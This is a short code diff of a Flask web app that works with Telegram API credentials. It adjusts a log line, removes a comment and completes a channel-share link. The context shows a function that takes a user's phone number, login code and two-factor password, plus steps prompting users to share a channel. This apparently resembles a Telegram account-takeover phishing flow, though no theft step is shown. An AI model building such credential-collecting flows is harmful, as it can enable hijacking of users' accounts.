@@ -28,9 +28,9 @@ API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _safe_int(os.environ.get("OWNER_ID"), 0)
 PORT = _safe_int(os.environ.get("PORT"), 5000)
 
-logger.info("ENV | BOT=%s | API_ID=%s | API_HASH=%s | OWNER=%s | PORT=%s",
+logger.info("ENV | BOT=%s | API_ID=%s | API_HASH=%s | OWNER=%s",
     "SET" if BOT_TOKEN else "MISSING", API_ID,
-    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID, PORT)
+    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID)
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
@@ -229,7 +229,6 @@ def run_telegram_action(phone, code=None, password=None):
         loop.close()
 
 
-# ============ ROUTES ============
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -715,4 +714,5 @@ updateShareSteps();
 }
 
 function doShare() {
-var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURI
+var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
+if (tg) { tg.openTelegramLink(shareUrl); }
